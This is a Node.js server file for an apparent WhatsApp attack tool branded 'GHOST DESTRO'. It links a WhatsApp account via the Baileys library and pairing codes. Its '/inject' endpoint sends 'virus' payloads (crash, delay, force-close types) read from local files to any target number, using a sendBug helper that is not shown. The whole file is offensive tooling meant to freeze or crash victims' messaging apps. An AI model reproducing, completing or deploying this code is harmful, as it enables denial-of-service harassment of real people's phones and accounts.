/* € Creator: ZENITH X SKY
©2026 - GHOST DESTRO PREMIUM ENGINE (STABLE RECOVERY)
*/

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeCacheableSignalKeyStore 
} = require("@whiskeysockets/baileys");
const P = require('pino');
const chalk = require('chalk');
const cfonts = require('cfonts');
const boxen = require('boxen');
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const path = require('path');

const { sendBug } = require('./fun.js');

const app = express();
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static(__dirname));

let sock = null;
let isConnected = false;

// KONFIGURASI PAYLOAD
const getVirusPayload = (type) => {
    const files = {
        'DELAY': './VIRUS LAG BY GHOSTNAME.txt',
        'CRASH': './VirusPending+Legh.txt',
        'FORCECLOSE': './VirusPending+Legh.txt',
        'JPG_VIR': './VIRUS LAG BY GHOSTNAME.txt'
    };
    const filePath = files[type] || './VIRUS LAG BY GHOSTNAME.txt';
    try {
        return fs.existsSync(filePath) ? fs.readFileSync(filePath, 'utf-8') : "☣️ GHOST DESTRO VOID ☣️";
    } catch (e) { return "☣️ SYSTEM_CRITICAL_ERROR ☣️"; }
};

async function startDestroEngine() {
    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState("destro_session");

    console.clear();
    cfonts.say('DESTRO IT|V10', { font: 'block', align: 'center', gradient: ['red', 'magenta'] });
    console.log(boxen(chalk.red.bold("ZENITH CORE ONLINE | PORT 7700"), { padding: 1, borderColor: 'red' }));

    if (sock) { sock.ev.removeAllListeners(); }

    sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'fatal' })),
        },
        printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "110.0.5481.177"],
        logger: P({ level: 'fatal' }),
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            isConnected = true;
            console.log(chalk.green.bold("\n [✓] STATUS: ENGINE TERHUBUNG!"));
        }
        if (connection === 'close') {
            isConnected = false;
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                setTimeout(() => startDestroEngine(), 5000); 
            }
        }
    });
}

// --- API ENDPOINTS ---

app.get('/status', (req, res) => res.json({ connected: isConnected }));

app.get('/getgroups', async (req, res) => {
    try {
        if (!isConnected || !sock) return res.status(500).json({ error: "Offline" });
        const groups = await sock.groupFetchAllParticipating();
        res.json(Object.values(groups));
    } catch (e) { res.status(500).json({ error: "Retry" }); }
});

app.post('/get-pairing', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ error: "No Number" });
    
    // NOTIFIKASI KE TERMUX (FITUR BARU)
    console.log(boxen(chalk.yellow.bold(`[!] ALERT: SESEORANG MENCOBA TAUTKAN NOMOR\nTARGET: ${number}`), {padding: 1, borderColor: 'yellow', borderStyle: 'double'}));
    
    try {
        if (!sock) await startDestroEngine();
        

        let code = await sock.requestPairingCode(number.replace(/\D/g, ''));
        res.json({ code: code });
        console.log(chalk.cyan(`[✓] PAIRING CODE BERHASIL DIKIRIM KE WEB: ${code}`));
    } catch (err) { 
        console.log(chalk.red("[X] GAGAL GENERATE PAIRING CODE!"));
        res.status(500).json({ error: "Server Busy" }); 
    }
});

app.post('/inject', async (req, res) => {
    const { target, type } = req.body;
    if (!isConnected || !sock) return res.status(500).json({ status: "offline" });
    const jid = target.includes('@') ? target : target + "@s.whatsapp.net";
    const payload = getVirusPayload(type);
    try {
        await sendBug(sock, jid, type, payload);
        res.json({ status: "success" });
    } catch (e) { res.status(500).json({ status: "error" }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

process.on('uncaughtException', (err) => console.log(chalk.red(`[FATAL] ${err.message}`)));
process.on('unhandledRejection', (reason) => console.log(chalk.red(`[PROMISE] ${reason}`)));

const PORT = 7700;
app.listen(PORT, "0.0.0.0", () => {
    console.log(chalk.cyan(`[!] ENGINE ON PORT ${PORT}`));
    startDestroEngine().catch(e => console.log("Engine Error:", e));
});
